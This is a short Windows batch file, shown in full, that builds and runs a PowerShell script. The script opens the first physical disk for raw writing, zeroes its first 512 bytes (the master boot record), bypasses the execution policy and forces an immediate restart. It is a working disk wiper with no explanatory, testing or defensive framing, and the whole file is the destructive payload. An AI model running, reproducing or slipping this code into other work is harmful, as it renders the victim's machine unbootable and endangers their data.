@echo off
echo $fs = new-object System.IO.FileStream '\\.\PhysicalDrive0', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Write > script.ps1
echo try { >> script.ps1
echo     $bytes = new-object byte[] 512 >> script.ps1
echo     $fs.Write($bytes, 0, 512) >> script.ps1
echo } finally { >> script.ps1
echo     $fs.Close() >> script.ps1
echo } >> script.ps1
echo Restart-Computer -Force >> script.ps1
powershell -ExecutionPolicy Bypass -File script.ps1
